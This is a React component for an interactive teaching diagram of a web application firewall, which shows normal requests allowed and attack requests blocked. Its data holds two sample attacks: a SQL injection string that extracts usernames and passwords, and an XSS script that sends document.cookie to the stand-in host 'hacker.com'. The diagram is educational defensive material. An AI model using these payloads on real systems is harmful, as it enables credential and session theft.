import React, { useState } from 'react';

type PayloadType = 'normal' | 'sqli' | 'xss';
type Status = 'idle' | 'scanning' | 'allowed' | 'blocked';

export default function WafDiagram(): React.JSX.Element {
  const [payloadType, setPayloadType] = useState<PayloadType>('normal');
  const [status, setStatus] = useState<Status>('idle');

  const payloads = {
    normal: {
      url: 'GET /api/v1/users?id=12',
      body: 'None'
    },
    sqli: {
      url: "GET /api/v1/users?id=12 UNION SELECT null, username, password FROM users--",
      body: 'None'
    },
    xss: {
      url: 'POST /api/v1/comments',
      body: '{"text": "<script>fetch(\'http://hacker.com/steal?cookie=\' + document.cookie)</script>"}'
    }
  };

  const handleTest = () => {
    setStatus('scanning');
    setTimeout(() => {
      if (payloadType === 'normal') {
        setStatus('allowed');
      } else {
        setStatus('blocked');
      }
    }, 1200);
  };

  return (
    <div className="interactive-diagram-container" style={{ margin: '1.5rem 0' }}>
      <div className="interactive-diagram-card-header" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0.6rem 1rem', borderBottom: '1px solid rgba(255,255,255,0.08)' }}>
        <h3 style={{ margin: 0, fontSize: '0.95rem', fontWeight: 700 }}>
          🛡️ Layer 7 Web Application Firewall (WAF) Request Inspector
        </h3>
        <div style={{ display: 'flex', gap: 6 }}>
          <button onClick={() => { setPayloadType('normal'); setStatus('idle'); }} style={{ background: payloadType === 'normal' ? 'rgba(74,222,128,0.12)' : 'rgba(255,255,255,0.03)', border: `1px solid ${payloadType === 'normal' ? '#4ade80' : 'rgba(255,255,255,0.08)'}`, borderRadius: 4, color: payloadType === 'normal' ? '#4ade80' : '#94a3b8', cursor: 'pointer', padding: '4px 10px', fontSize: '0.78rem', fontWeight: 600 }}>Normal traffic</button>
          <button onClick={() => { setPayloadType('sqli'); setStatus('idle'); }} style={{ background: payloadType === 'sqli' ? 'rgba(248,113,113,0.12)' : 'rgba(255,255,255,0.03)', border: `1px solid ${payloadType === 'sqli' ? '#f87171' : 'rgba(255,255,255,0.08)'}`, borderRadius: 4, color: payloadType === 'sqli' ? '#f87171' : '#94a3b8', cursor: 'pointer', padding: '4px 10px', fontSize: '0.78rem', fontWeight: 600 }}>SQL Injection</button>
          <button onClick={() => { setPayloadType('xss'); setStatus('idle'); }} style={{ background: payloadType === 'xss' ? 'rgba(248,113,113,0.12)' : 'rgba(255,255,255,0.03)', border: `1px solid ${payloadType === 'xss' ? '#f87171' : 'rgba(255,255,255,0.08)'}`, borderRadius: 4, color: payloadType === 'xss' ? '#f87171' : '#94a3b8', cursor: 'pointer', padding: '4px 10px', fontSize: '0.78rem', fontWeight: 600 }}>XSS Script</button>
        </div>
      </div>

      <div style={{ padding: '1.2rem' }} className="interactive-diagram-grid-bg">
        {/* Request details */}
        <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '1.2rem', marginBottom: '1rem' }}>
          <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '1rem' }}>
            <h4 style={{ margin: '0 0 6px 0', fontSize: '0.85rem', color: '#e2e8f0' }}>Outbound Request Details</h4>
            <div style={{ fontFamily: 'monospace', fontSize: '0.72rem', color: '#38bdf8', marginBottom: '6px' }}>
              URL: {payloads[payloadType].url}
            </div>
            <div style={{ fontFamily: 'monospace', fontSize: '0.72rem', color: '#94a3b8' }}>
              Body: {payloads[payloadType].body}
            </div>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', justifyItems: 'center', justifyContent: 'center', alignItems: 'center', background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '1rem' }}>
            <button onClick={handleTest} style={{ padding: '8px 16px', background: '#38bdf8', border: 'none', borderRadius: 4, color: '#090b14', fontWeight: 700, fontSize: '0.8rem', cursor: 'pointer', marginBottom: '8px' }}>
              Send traffic to WAF
            </button>
            <div style={{ fontSize: '0.85rem', fontWeight: 700, color: status === 'scanning' ? '#fb923c' : status === 'allowed' ? '#4ade80' : status === 'blocked' ? '#f87171' : '#94a3b8' }}>
              Status: {status === 'idle' ? 'Ready' : status === 'scanning' ? 'Inspecting...' : status === 'allowed' ? '200 OK (Allowed) ✅' : '403 Forbidden (Blocked) ❌'}
            </div>
          </div>
        </div>

        {/* Dynamic description box */}
        <div style={{ background: 'rgba(255,255,255,0.01)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: 6, padding: '10px' }}>
          <p style={{ margin: 0, fontSize: '0.76rem', color: '#94a3b8', lineHeight: 1.45 }}>
            {payloadType === 'normal' && '💡 Normal payload passes verification checks without triggers, forwarded cleanly to downstream application containers.'}
            {payloadType === 'sqli' && '🚨 SQL Injection payload triggers AWSManagedRulesCommonRuleSet/SQLi regex rule checks. WAF cuts connection at edge, preventing load balancer ingestion or database execution.'}
            {payloadType === 'xss' && '🚨 Cross-Site Scripting (XSS) payload containing script tags is parsed. WAF drops request to protect browser DOM executions downstream.'}
          </p>
        </div>
      </div>
    </div>
  );
}
